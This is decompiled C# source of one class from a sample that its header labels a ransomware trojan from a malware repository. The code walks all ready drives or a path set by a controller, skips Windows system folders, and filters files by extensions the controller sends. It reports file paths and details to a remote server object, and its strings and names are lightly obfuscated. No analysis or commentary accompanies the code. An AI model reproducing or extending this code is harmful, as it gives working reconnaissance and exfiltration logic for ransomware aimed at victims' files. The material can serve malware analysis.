// Decompiled with JetBrains decompiler
// Type: thandhwiar.DSADRIVF
// Assembly: thandhwiar, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89805F93-CF8A-4ECE-A0DD-C3C2D313114A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-a0f6963845d7aeae328048da66059059fdbcb6cc30712fd10a34018caf0bd28a.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace thandhwiar
{
  internal class DSADRIVF
  {
    public MSAMCDM iserver;
    public int sIndx;
    public List<string> notdFilders = new List<string>();
    public List<string> sFidles = new List<string>();
    public int fIndsx;
    public List<string> fEsxts = new List<string>();
    public bool reaging;

    public void send_Seasrch(string path)
    {
      try
      {
        foreach (string addFilde in this.add_Fildes(path))
        {
          if (this.fEsxts.Contains(Path.GetExtension(addFilde).ToLower()))
          {
            string str = this.iserver.file_info(addFilde, true);
            this.iserver.push_dsata((byte[]) null, "sesarf=!".Split('!')[0] + addFilde + "<FILDE_AUTDO<!".Split('!')[0] + str);
          }
          if (this.iserver.auttCnls)
            break;
        }
      }
      catch
      {
      }
    }

    public string check_Folsders(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string directory in Directory.GetDirectories(path))
        {
          if (this.see_Accsess(directory))
            str = str + directory + ">|".Split('|')[0];
        }
      }
      return str;
    }

    public DSADRIVF()
    {
      this.notdFilders.Add("windows|".Split('|')[0]);
      this.notdFilders.Add("program files (x86)|".Split('|')[0]);
      this.notdFilders.Add("program files|".Split('|')[0]);
      this.notdFilders.Add("system volume information|".Split('|')[0]);
    }

    public string lookup_Fises(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string file in Directory.GetFiles(path))
          str = str + file + ">|".Split('|')[0];
      }
      return str;
    }

    public IEnumerable<string> add_Fildes(string path)
    {
      Queue<string> moreFiles = new Queue<string>();
      moreFiles.Enqueue(path);
      while (moreFiles.Count > 0 && !this.iserver.auttCnls)
      {
        path = moreFiles.Dequeue();
        try
        {
          foreach (string directory in Directory.GetDirectories(path))
          {
            if (this.see_Accsess(directory) && !this.notdFilders.Contains(directory.ToLower()))
              moreFiles.Enqueue(directory);
          }
        }
        catch
        {
        }
        string[] files = Directory.GetFiles(path);
        if (files != null)
        {
          for (int i = 0; i < files.Length; ++i)
            yield return files[i];
        }
      }
    }

    public void look_Filses(string tempStr)
    {
      this.iserver.auttCnls = false;
      this.fEsxts.Clear();
      this.sFidles.Clear();
      this.fIndsx = 0;
      this.sIndx = 0;
      string[] strArray = tempStr.Split('<');
      if (strArray.Length <= 1)
        return;
      string str1 = strArray[0];
      char[] chArray = new char[1]{ '>' };
      foreach (string str2 in str1.Split(chArray))
      {
        if (str2 != "")
          this.fEsxts.Add(str2);
      }
      if (strArray[1] != "")
      {
        this.reaging = true;
        this.send_Seasrch(strArray[1]);
        this.reaging = false;
        this.iserver.push_dsata((byte[]) null, "sesard=seasing!".Split('!')[0]);
      }
      else
      {
        DriveInfo[] drives = DriveInfo.GetDrives();
        this.reaging = true;
        foreach (DriveInfo driveInfo in drives)
        {
          if (driveInfo.IsReady)
            this.send_Seasrch(driveInfo.Name);
        }
        this.iserver.push_dsata((byte[]) null, "sesard=seashing!".Split('!')[0]);
        this.reaging = false;
      }
    }

    public string lookup_Drsves()
    {
      string str = "";
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
          str = str + drive.Name + ">!".Split('!')[0];
      }
      return str;
    }

    public bool see_Accsess(string fPath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
      try
      {
        directoryInfo.GetDirectories();
        return true;
      }
      catch (Exception ex)
      {
        return false;
      }
    }
  }
}
